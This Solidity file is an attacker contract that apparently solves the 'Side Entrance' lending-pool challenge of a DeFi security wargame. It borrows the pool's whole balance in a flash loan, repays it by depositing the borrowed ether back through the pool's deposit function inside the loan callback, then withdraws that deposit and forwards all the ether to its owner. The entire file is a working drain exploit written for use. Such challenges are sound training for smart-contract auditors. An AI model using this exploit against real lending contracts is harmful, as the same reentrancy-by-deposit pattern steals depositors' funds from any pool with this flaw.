// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEnterer {
    using Address for address payable;
    address payable immutable owner;
    ISideEntranceLenderPool pool;

    constructor(address _pool) {
        owner = payable(msg.sender);
        pool = ISideEntranceLenderPool(_pool);
    }

    modifier onlyOwner {
        require(owner == msg.sender, "Non-owner call");
        _;
    }

    modifier onlyPool {
        require(address(pool) == msg.sender, "Non-pool call");
        _;
    }

    function takeFlashloanThenDrain() public onlyOwner {
        uint256 loanValue = address(pool).balance;

        // take flash loan and replay via deposit function
        pool.flashLoan(loanValue);

        // withdraw from pool
        pool.withdraw();

        // send ether to owner
        owner.sendValue(address(this).balance);
    }

    function execute() public payable onlyPool {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}

}